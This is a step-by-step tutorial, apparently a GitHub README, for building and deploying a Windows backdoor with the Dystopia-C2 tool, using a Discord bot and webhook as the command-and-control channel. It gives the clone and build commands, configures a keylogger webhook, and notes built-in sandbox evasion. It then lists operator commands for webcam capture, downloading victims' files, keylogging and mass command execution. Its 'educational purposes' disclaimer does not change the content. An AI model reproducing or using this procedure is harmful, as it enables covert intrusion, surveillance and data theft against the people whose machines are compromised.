# Hack Windows with Discord  

This project demonstrates how Discord can be exploited as a Command-and-Control (C2) channel to manage a backdoor on a Windows system. Below is a detailed step-by-step explanation of the attack process for educational purposes.  

---

## Step-by-Step Guide  

### 1. Installing Dystopia-C2 on Kali Linux  
- Clone the Dystopia-C2 repository from GitHub:  
  ```bash
  git clone https://github.com/3ct0s/dystopia-c2
  ```  
- Navigate into the directory and prepare the environment for running Dystopia-C2:  
  ```bash
  cd dystopia-c2
  ```  

---

### 2. Setting up a Discord Server  
1. Log in to your Discord account.  
2. Go to **Settings → Advanced Options** and enable **Developer Mode**.  
3. Create a new server with any preferred name (e.g., "server").  

---

### 3. Creating a Discord Bot  
1. Visit the [Discord Developer Portal](https://discord.com/developers/applications).  
2. Click on **New Application** and name your bot.  
3. Navigate to the **Bot** section and scroll down to enable **Privileged Gateway Intents** (select all options and save changes).  
4. Go to **OAuth2 → URL Generator**, select **Bot**, and set its privileges to **Administrator**.  
5. Copy the generated URL, paste it into your browser, and select the server you created earlier to add the bot.  

---

### 4. Retrieving and Storing the Bot Token  
1. In the Developer Portal, go to the **Bot** section and click **Reset Token** to generate your bot token.  
2. Copy the token and paste it into the server's chat or store it securely for future use.  

---

### 5. Creating a Webhook  
1. Navigate to Discord **Server Settings → Integrations → Webhooks**.  
2. Create a new webhook (default name: "Spidey Bot"), rename it to **Keylogger**, set the channel to "General," and save changes.  

---

### 6. Generating the Backdoor  
1. Open your Kali terminal and navigate to the `dystopia-c2` directory.  
2. Run the builder tool:  
   ```bash
   sudo python3 builder.py
   ```  
3. Select the **Discord module**:  
   ```bash
   use discord
   ```  

#### Configure the following settings for the backdoor:  
- **Name**: Set the backdoor name to `dystopia`.  
- **Guild ID**: Right-click the server name in Discord and select **Copy Server ID**.  
- **Bot Token**: Use the token generated earlier.  
- **Channel ID**: Right-click the "General" channel and select **Copy Channel ID**.  
- **Webhook URL**: Go to **Server Settings → Integrations → Webhooks**, click on "Keylogger," and copy the webhook URL.  

4. Build the bot:  
   ```bash
   build
   ```  
   Confirm the build by typing `y` when prompted.  
5. The generated backdoor (`dystopia.exe`) will appear in the `dist` directory.  

---

### 7. Sandbox Evasion  
- The backdoor includes **sandbox evasion** by default.  
- If the Windows host is a virtual machine (VM), the bot will terminate execution to prevent dynamic analysis.  

---

### 8. Running the Backdoor  
1. Transfer the `dystopia.exe` file to a Windows machine.  
2. Run the executable.  
3. Once executed, the bot sends a message to the Discord server notifying the attacker of a new agent online.  
4. Multiple agents can be connected and managed simultaneously.  

---

## Examples of Commands  

### 1. Listing Active Agents  
```bash
list agents
```  
Displays all connected agents in the system.  

### 2. Accessing the Webcam  
```bash
webcam capture
```  
Takes a snapshot using the webcam of the compromised system.  

### 3. File Download  
```bash
download <file_path>
```  
Downloads a specified file from the compromised system to the attacker's machine.  

### 4. Keylogging  
```bash
start keylogger
```  
Starts capturing keystrokes from the victim’s system.  

### 5. Mass Command Execution  
```bash
mass exec <command>
```  
Executes a command across all connected agents simultaneously.  

---

## Disclaimer  

This project is strictly for **educational purposes only**. It is intended to raise awareness about potential misuse of trusted platforms like Discord. Please use this knowledge responsibly and ethically.  

